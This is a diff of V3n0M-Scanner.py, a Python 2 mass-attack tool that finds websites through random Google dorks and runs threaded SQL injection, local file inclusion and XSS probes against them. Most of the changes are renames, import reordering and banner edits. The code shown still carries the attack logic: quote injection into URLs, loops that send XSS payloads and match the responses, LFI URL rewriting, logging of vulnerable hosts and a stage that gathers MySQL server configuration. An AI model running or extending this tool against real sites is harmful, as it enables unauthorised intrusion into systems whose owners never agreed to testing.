@@ -53,10 +53,7 @@
 
 
 import re
-import time
-import sys
 import random
-import math
 import threading
 import socket
 import urllib2
@@ -64,11 +61,13 @@ import cookielib
 import subprocess
 import codecs
 
+import time
+import sys
+import math
+
+
 #import statics 
-import urllib
-import urlparse
 import itertools
-import Queue
 
 d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
 random.shuffle(d0rk)
@@ -138,8 +137,8 @@ B = "\033[34m"
 def logo():
 	print R + "\n|----------------------------------------------------------------|"
 	print "|                  V3n0M-Scanner.py   - By NovaCygni             |"
-	print "|     Release Date 23/10/2013  - Release Version V.3.2.1         |"
-	print "|          THIS IS A PRERELEASE BETA  TEST VERSION               |"
+	print "|     Release Date 02/12/2013  - Release Version V.3.3.1         |"
+	print "|          										                |"
 	print "|                         NovaCygni                              |"
 	print "|                    _____       _____                           |"
 	print "|                   |____ |     |  _  |                          |"
@@ -147,11 +146,11 @@ def logo():
 	print "|             \ \ / /   \ \ '_ \|  /| | '_ ` _ \                 |"
 	print "|              \ V /.___/ / | | \ |_/ / | | | | |                |"
 	print "|    Official   \_/ \____/|_| |_|\___/|_| |_| |_|  Release       |"
-	print "|   Note: PLEASE RUN TOR ON PORT 9050 TO USE TOR FEATURES        |"
+	print "|    													        |"
 	print "|----------------------------------------------------------------|\n"
 
 
-if sys.platform.startswith('linux') or sys.platform.startswith('linux2'):
+if sys.platform == 'linux' or sys.platform == 'linux2':
 	subprocess.call("clear", shell=True)
 	logo()
 
@@ -159,7 +158,6 @@ if sys.platform.startswith('linux') or sys.platform.startswith('linux2'):
 else:
 	subprocess.call("cls", shell=True)
 	logo()
-
 
 lfi_log = "v3n0m-lfi.txt"
 lfi_log_file = open(lfi_log, "a")
@@ -181,6 +179,7 @@ vuln = []
 col = []
 timeout = 75
 socket.setdefaulttimeout(timeout)
+
 
 def search(maxc):
 	urls = []
@@ -266,7 +265,7 @@ def search(maxc):
 
 
 
-class injThread(threading.Thread):
+class Injthread(threading.Thread):
 	def __init__(self, hosts):
 		self.hosts = hosts
 		self.fcount = 0
@@ -278,7 +277,7 @@ class injThread(threading.Thread):
 		for url in urls:
 			try:
 				if self.check:
-					ClassicINJ(url)
+					classicinj(url)
 				else:
 					break
 			except(KeyboardInterrupt, ValueError):
@@ -289,7 +288,7 @@ class injThread(threading.Thread):
 		self.check = False
 
 
-class lfiThread(threading.Thread):
+class Lfithread(threading.Thread):
 	def __init__(self, hosts):
 		self.hosts = hosts
 		self.fcount = 0
@@ -301,7 +300,7 @@ class lfiThread(threading.Thread):
 		for url in urls:
 			try:
 				if self.check:
-					ClassicLFI(url)
+					classiclfi(url)
 				else:
 					break
 			except(KeyboardInterrupt, ValueError):
@@ -312,7 +311,7 @@ class lfiThread(threading.Thread):
 		self.check = False
 
 
-class xssThread(threading.Thread):
+class Xssthread(threading.Thread):
 	def __init__(self, hosts):
 		self.hosts = hosts
 		self.fcount = 0
@@ -324,7 +323,7 @@ class xssThread(threading.Thread):
 		for url in urls:
 			try:
 				if self.check:
-					ClassicXSS(url)
+					classicxss(url)
 				else:
 					break
 			except(KeyboardInterrupt, ValueError):
@@ -335,7 +334,8 @@ class xssThread(threading.Thread):
 		self.check = False
 
 
-def ClassicINJ(url):
+def classicinj(url):
+	#noinspection PyPep8Naming,PyPep8Naming
 	EXT = "'"
 	host = url + EXT
 	try:
@@ -355,7 +355,7 @@ def ClassicINJ(url):
 		pass
 
 
-def ClassicLFI(url):
+def classiclfi(url):
 	lfiurl = url.rsplit('=', 1)[0]
 	if lfiurl[-1] != "=":
 		lfiurl = lfiurl + "="
@@ -385,7 +385,7 @@ def ClassicLFI(url):
 			pass
 
 
-def ClassicXSS(url):
+def classicxss(url):
 	for xss in xsses:
 		try:
 			source = urllib2.urlopen(url + xss.replace("\n", "")).read()
@@ -402,7 +402,8 @@ def ClassicXSS(url):
 			                                                                            source) or re.findall(
 					"XSS Javascript Escapes Vulnerability Detected", source) or re.findall(
 					"XSS End Title Tag Vulnerability Detected", source) or re.findall(
-					"XSS Style Tags with Broken Javascript Vulnerability Detected", source) or re.findall("<OY1Py", source) or re.findall(
+					"XSS Style Tags with Broken Javascript Vulnerability Detected", source) or re.findall("<OY1Py",
+			                                                                                              source) or re.findall(
 					"<LOY2PyTRurb1c", source):
 				print R + "[XSS]: ", O + url + xss, R + " ---> XSS Found (manual verification required)"
 				xss_log_file.write("\n" + url + xss)
@@ -426,7 +427,7 @@ def injtest():
 			if z < m:
 				sliced.append(usearch[int(numthreads) * i + z])
 				z += 1
-			thread = injThread(sliced)
+			thread = Injthread(sliced)
 			thread.start()
 			threads.append(thread)
 		for thread in threads:
@@ -446,7 +447,7 @@ def lfitest():
 			if z < m:
 				sliced.append(usearch[int(numthreads) * i + z])
 				z += 1
-			thread = lfiThread(sliced)
+			thread = Lfithread(sliced)
 			thread.start()
 			threads.append(thread)
 		for thread in threads:
@@ -466,7 +467,7 @@ def xsstest():
 			if z < m:
 				sliced.append(usearch[int(numthreads) * i + z])
 				z += 1
-			thread = xssThread(sliced)
+			thread = Xssthread(sliced)
 			thread.start()
 			threads.append(thread)
 		for thread in threads:
@@ -491,7 +492,7 @@ while True:
 
 		go = []
 
-		dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : ");
+		dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
 		print ""
 		if int(dorks) == 0:
 			i = 0
@@ -595,7 +596,7 @@ while True:
 					pass
 
 			print "\n[!] Sorry column length could not be found\n"
-			###########
+		###########
 
 		print B + "\n[+] Gathering MySQL Server Configuration..."
 		for site in darkurl:
